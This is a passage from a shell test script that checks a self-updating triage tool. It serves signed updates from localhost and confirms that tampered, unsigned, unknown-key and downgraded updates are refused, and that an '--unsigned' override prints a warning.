	printf '#!/bin/sh\nexec %s "$@"\n' "$SIGNIFY" >"$W/bin/usign"; chmod +x "$W/bin/usign"
	mkver() { sed -e "s|^UPDATE_KEYS='.*'\$|UPDATE_KEYS='$keys'|" -e "s|^VERSION=.*|VERSION=$1|" "$T" >"$2"; }
	serve() { mkver "$1" "$W/www/fix"; "$SIGNIFY" -S -s "$W/$2.sec" -m "$W/www/fix" -x "$W/www/fix.sig"; }
	upd() { env PATH="$W/bin:$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update >"$W/out.txt" 2>&1; }
	ver() { sed -n 's/^VERSION=//p' "$W/dev/t.sh"; }
	(cd "$W/www" && exec python3 -m http.server 18473 --bind 127.0.0.1 >/dev/null 2>&1) & SRV=$!
	sleep 1
	mkver 2.60 "$W/dev/t.sh"; serve 2.61 k1
	upd; rc=$?
	[ $rc = 0 ] || { echo "    exit $rc, and the script said:"; sed 's/^/    | /' "$W/out.txt"; }
	expect "a newer version with a good signature replaces the script, the old one is kept" '[ $rc = 0 ] && [ "$(ver)" = 2.61 ] && grep -q "^VERSION=2.60$" "$W/dev/t.sh.old" && grep -q "Updated to version 2.61" "$W/out.txt" && cmp -s "$W/dev/t.sh" "$W/www/fix"'
	upd; rc=$?
	expect "the same version again: nothing to do" '[ $rc = 0 ] && grep -q "This is the current version" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 k1; echo 'echo added on the way' >>"$W/www/fix"
	upd; rc=$?
	expect "a download changed on the way is refused" '[ $rc = 4 ] && grep -q "signature does not fit" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 kx
	upd; rc=$?
	expect "a signature made with an unknown key is refused" '[ $rc = 4 ] && grep -q "signature does not fit" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.50 k1
	upd; rc=$?
	expect "an older version is refused although its signature is good" '[ $rc = 4 ] && grep -q "older than this one" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 k2
	upd; rc=$?
	expect "the spare key is taken as well" '[ $rc = 0 ] && [ "$(ver)" = 2.62 ]'
	serve 2.63 k1; rm "$W/www/fix.sig"
	upd; rc=$?
	expect "without a signature nothing is replaced" '[ $rc = 4 ] && grep -q "no signature is served" "$W/out.txt" && [ "$(ver)" = 2.62 ]'
	serve 2.63 k1
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update >"$W/out.txt" 2>&1; rc=$?
	expect "without usign the script says so and replaces nothing where nobody can be asked" '[ $rc = 4 ] && grep -q "has no usign" "$W/out.txt" && grep -q "add --unsigned" "$W/out.txt" && [ "$(ver)" = 2.62 ]'
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "with --unsigned it updates all the same and says that nothing was checked" '[ $rc = 0 ] && [ "$(ver)" = 2.63 ] && grep -q "signature was NOT checked" "$W/out.txt"'
	serve 2.50 k1
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "an older version is refused without the check as well" '[ $rc = 4 ] && grep -q "older than this one" "$W/out.txt" && [ "$(ver)" = 2.63 ]'
	serve 2.64 k1; echo 'echo added on the way' >>"$W/www/fix"
	env PATH="$W/bin:$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "where usign is there, --unsigned is not a way around a signature that does not fit" '[ $rc = 4 ] && [ "$(ver)" = 2.63 ]'
	kill "$SRV" 2>/dev/null
else
	echo "  SKIP: needs signify (signify-openbsd) and python3"
fi

echo; echo "RESULT: $pass passed, $fail failed"
[ "$fail" = 0 ]
